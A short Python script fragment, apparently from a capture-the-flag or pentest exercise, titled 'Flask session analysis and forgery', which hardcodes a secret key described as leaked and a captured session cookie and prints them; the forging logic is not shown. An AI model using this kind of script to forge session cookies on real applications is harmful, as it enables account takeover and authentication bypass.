import base64
import json
import hmac
import hashlib
import time
from urllib.parse import quote, unquote

# The leaked SECRET_KEY from the environment
SECRET_KEY = 'G7x7pMBBduHU0HH5avEQ'

# The captured session cookie
captured_cookie = 'eyJfZnJlc2giOmZhbHNlfQ.aVcAlQ._iR0jFMQlN7S10HnF9G9QGAnzec'

print("FLASK SESSION ANALYSIS AND FORGERY")
print("="*50)
print(f"SECRET_KEY: {SECRET_KEY}")
